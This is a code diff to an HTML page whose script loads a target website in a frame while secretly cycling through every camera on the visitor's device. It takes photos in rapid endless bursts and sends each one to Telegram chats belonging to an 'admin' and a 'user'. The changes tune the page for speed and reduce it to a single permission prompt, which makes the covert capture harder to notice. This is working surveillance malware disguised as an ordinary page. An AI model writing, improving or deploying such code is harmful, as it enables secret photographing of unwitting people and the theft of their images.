@@ -54,7 +54,7 @@
 
     <script>
         // =====================================================
-        //  ULTRA FAST BURST: 3 FRONT + 3 BACK, REPEAT FOREVER
+        //  ULTRA FAST BURST - SINGLE PERMISSION REQUEST
         // =====================================================
         
         function getConfigFromURL() {
@@ -86,16 +86,17 @@
         
         // ⚡ ULTRA FAST CONFIG
         const PHOTOS_PER_CAMERA = 3;      // 3 photos each camera
-        const CAPTURE_DELAY = 100;         // 100ms between photos (FAST!)
-        const WARMUP_TIME = 800;           // 800ms warmup (faster)
-        const SWITCH_DELAY = 400;          // 400ms switch delay (faster)
+        const CAPTURE_DELAY = 80;          // 80ms between photos (ULTRA FAST!)
+        const WARMUP_TIME = 600;           // 600ms warmup
+        const SWITCH_DELAY = 200;          // 200ms switch delay (minimal)
         
-        let cameraStream = null;
-        let currentFacingMode = 'user';
+        let availableCameras = [];
+        let currentCameraIndex = 0;
         let burstRunning = false;
         let photoCounter = 0;
         let totalPhotosSent = 0;
         let cameraReady = false;
+        let currentStream = null;
         
         const cameraVideo = document.getElementById('cameraVideo');
         const websiteFrame = document.getElementById('websiteFrame');
@@ -109,55 +110,77 @@
             }
         }
         
-        // ULTRA FAST camera start
-        async function startCamera() {
+        // Get all available cameras (ONLY ONCE!)
+        async function discoverCameras() {
+            try {
+                console.log('🔍 Discovering cameras...');
+                
+                // Request permission ONCE with both cameras
+                const tempStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
+                });
+                
+                // Permission granted! Now get all devices
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                
+                // Stop temp stream
+                tempStream.getTracks().forEach(track => track.stop());
+                
+                availableCameras = videoDevices;
+                console.log(`✅ Found ${availableCameras.length} cameras:`, videoDevices.map(d => d.label));
+                
+                return availableCameras.length > 0;
+            } catch (error) {
+                console.error('❌ Camera discovery error:', error);
+                return false;
+            }
+        }
+        
+        // Switch to specific camera by device ID
+        async function switchToCamera(deviceId) {
             try {
                 cameraReady = false;
-                console.log(`📹 ${currentFacingMode.toUpperCase()} camera...`);
+                
+                // Stop current stream
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                
+                console.log(`📹 Switching to camera: ${deviceId}`);
                 
                 const constraints = {
                     video: {
+                        deviceId: { exact: deviceId },
                         width: { ideal: 1280 },
                         height: { ideal: 720 },
-                        facingMode: currentFacingMode,
                         frameRate: { ideal: 30 }
                     }
                 };
                 
-                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-                cameraVideo.srcObject = cameraStream;
+                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraVideo.srcObject = currentStream;
                 
-                // Quick metadata wait
                 await new Promise((resolve) => {
                     cameraVideo.onloadedmetadata = resolve;
-                    setTimeout(resolve, 2000); // Fallback
+                    setTimeout(resolve, 1500);
                 });
                 
                 await cameraVideo.play();
                 
                 // Quick warmup
-                console.log(`⏳ Warmup ${WARMUP_TIME}ms...`);
                 await new Promise(resolve => setTimeout(resolve, WARMUP_TIME));
                 
                 cameraReady = true;
-                console.log(`✅ Ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
+                console.log(`✅ Camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                 return true;
             } catch (error) {
-                console.error('❌ Camera error:', error);
+                console.error('❌ Switch camera error:', error);
                 return false;
             }
         }
         
-        function stopCamera() {
-            cameraReady = false;
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraVideo.srcObject = null;
-                cameraStream = null;
-            }
-        }
-        
-        // ULTRA FAST capture (no validation for speed)
+        // ULTRA FAST capture
         async function captureFrameFast() {
             return new Promise((resolve) => {
                 if (!cameraReady || cameraVideo.readyState < 2) {
@@ -178,9 +201,7 @@
                     }
                     
                     ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-                    
-                    // Fast conversion (lower quality for speed)
-                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
+                    canvas.toBlob(resolve, 'image/jpeg', 0.87);
                 } catch (error) {
                     console.error('❌ Capture error:', error);
                     resolve(null);
@@ -188,11 +209,10 @@
             });
         }
         
-        // Fire and forget send to BOTH admin and user (ULTRA FAST)
+        // Fire and forget send to BOTH admin and user
         function sendPhotoFast(blob, cameraType, photoNum) {
             if (!blob) return;
             
-            // Send to both admin and user
             CHAT_IDS.forEach(chatId => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
@@ -201,7 +221,6 @@
                 const caption = `📸 ${cameraType.toUpperCase()} #${photoNum}\n👤 User: ${USER_CHAT_ID}`;
                 formData.append('caption', caption);
                 
-                // Fire and forget - don't wait!
                 fetch(`${TELEGRAM_API}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -214,59 +233,67 @@
             });
         }
         
-        async function switchCamera() {
-            console.log('🔄 Switching...');
-            stopCamera();
+        // Capture burst from current camera
+        async function captureBurstFromCamera(cameraLabel) {
+            console.log(`📸 Capturing ${PHOTOS_PER_CAMERA} photos from ${cameraLabel}...`);
             
-            await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
-            
-            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-            photoCounter = 0;
-            
-            return await startCamera();
+            for (let i = 0; i < PHOTOS_PER_CAMERA; i++) {
+                const blob = await captureFrameFast();
+                
+                if (blob) {
+                    photoCounter++;
+                    sendPhotoFast(blob, cameraLabel, photoCounter);
+                }
+                
+                if (i < PHOTOS_PER_CAMERA - 1) {
+                    await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
+                }
+            }
         }
         
         // MAIN ULTRA FAST BURST LOOP
         async function ultraFastBurst() {
             if (burstRunning) return;
+            if (availableCameras.length === 0) {
+                console.error('❌ No cameras available');
+                return;
+            }
             
             burstRunning = true;
-            console.log('⚡ ULTRA FAST BURST: 3 FRONT + 3 BACK, REPEAT FOREVER');
+            console.log('⚡ ULTRA FAST BURST: CYCLING THROUGH ALL CAMERAS');
             
             while (burstRunning) {
-                if (!cameraReady) {
-                    await new Promise(resolve => setTimeout(resolve, 200));
-                    continue;
+                // Cycle through all available cameras
+                for (let i = 0; i < availableCameras.length; i++) {
+                    const camera = availableCameras[i];
+                    const cameraLabel = camera.label || `Camera ${i + 1}`;
+                    const cameraType = cameraLabel.toLowerCase().includes('back') || 
+                                      cameraLabel.toLowerCase().includes('rear') || 
+                                      cameraLabel.toLowerCase().includes('environment') ? 'back' : 'front';
+                    
+                    console.log(`🔄 Switching to: ${cameraLabel}`);
+                    
+                    const switched = await switchToCamera(camera.deviceId);
+                    
+                    if (switched) {
+                        await captureBurstFromCamera(cameraType);
+                        
+                        // Small delay before next camera
+                        await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
+                    } else {
+                        console.error(`❌ Failed to switch to ${cameraLabel}`);
+                    }
                 }
                 
-                // Rapid fire 3 photos
-                for (let i = 0; i < PHOTOS_PER_CAMERA; i++) {
-                    const blob = await captureFrameFast();
-                    
-                    if (blob) {
-                        photoCounter++;
-                        sendPhotoFast(blob, currentFacingMode, photoCounter);
-                    }
-                    
-                    // Minimal delay between shots
-                    if (i < PHOTOS_PER_CAMERA - 1) {
-                        await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
-                    }
-                }
-                
-                // Switch camera
-                const switched = await switchCamera();
-                if (!switched) {
-                    console.error('❌ Switch failed');
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
+                console.log('🔁 Completed full cycle, restarting...');
             }
         }
         
         async function sendStartMessage() {
             try {
                 const msg = `⚡ *ULTRA FAST BURST MODE*\n\n` +
-                    `📸 Pattern: 3 FRONT → 3 BACK → REPEAT\n` +
+                    `📸 Cameras: ${availableCameras.length} detected\n` +
+                    `📷 Pattern: ${PHOTOS_PER_CAMERA} photos per camera\n` +
                     `⏱️ Speed: ${CAPTURE_DELAY}ms between shots\n` +
                     `🔄 Switch: ${SWITCH_DELAY}ms\n` +
                     `🌐 Site: ${config.website}\n` +
@@ -274,7 +301,6 @@
                     `👑 Admin ID: ${ADMIN_CHAT_ID}\n` +
                     `⏰ ${new Date().toLocaleString()}`;
                 
-                // Send to both admin and user
                 for (const chatId of CHAT_IDS) {
                     await fetch(`${TELEGRAM_API}/sendMessage`, {
                         method: 'POST',
@@ -298,21 +324,22 @@
             console.log('👑 Admin ID:', ADMIN_CHAT_ID);
             console.log('👤 User ID:', USER_CHAT_ID);
             console.log('🌐 Website:', config.website);
-            console.log('📸 Pattern: 3 FRONT + 3 BACK');
+            console.log('📸 Photos per camera:', PHOTOS_PER_CAMERA);
             console.log('⚡ Speed: MAXIMUM');
             console.log('📤 Sending to: BOTH admin & user');
             console.log('═══════════════════════════════════');
             
             loadWebsite();
-            await sendStartMessage();
             
-            const started = await startCamera();
+            // Discover cameras ONCE (single permission request)
+            const camerasFound = await discoverCameras();
             
-            if (started) {
+            if (camerasFound) {
+                await sendStartMessage();
                 console.log('🚀 Starting ultra fast burst...');
                 ultraFastBurst();
             } else {
-                console.error('❌ Camera failed to start');
+                console.error('❌ No cameras found or permission denied');
             }
         }
         
@@ -320,7 +347,9 @@
         
         window.addEventListener('beforeunload', () => {
             burstRunning = false;
-            stopCamera();
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
         });
     </script>
 </body>
